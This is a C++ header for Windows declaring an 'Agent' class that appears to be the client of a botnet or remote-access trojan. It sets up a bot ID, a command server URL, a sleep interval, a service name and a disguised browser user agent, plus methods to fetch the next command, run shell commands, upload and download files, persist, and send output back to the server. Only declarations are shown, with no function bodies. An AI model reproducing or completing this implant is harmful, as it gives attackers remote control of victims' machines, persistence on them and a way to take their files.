#pragma once

#include <string>
#include <Windows.h>
#include <direct.h>
#include <ctime>


class Agent {

public:

	Agent(const std::string& _server_url, const std::string& _botid = "", const unsigned int _sleep_interval = 10, const std::string& _service_name = "agent", const std::string& _user_agent = "Mozilla/4.0 (compatible)");

	std::string run_command(const std::string& command, bool isLocal=false);
	void cd(const std::string& newdir);
	void download(const std::string& url);
	void upload(const std::string& filename);
	void persist(const std::string& options);
	void open(const std::string& args);
	void help();
	
	void setInterval(const unsigned int new_interval);
	void setServiceName(const std::string& new_servicename);

	void run();
	void execute(const std::string& commandline);
	void stop();

private:

	std::string get_hostname();
	std::string get_os_name();
	std::string get_wd();
	std::string get_next_command();
	void send_output(const std::string& output);

	std::string botid;
	std::string os_name;
	std::string server_url;
	unsigned int sleep_interval;
	std::string service_name;
	std::string user_agent;
	bool running;
};
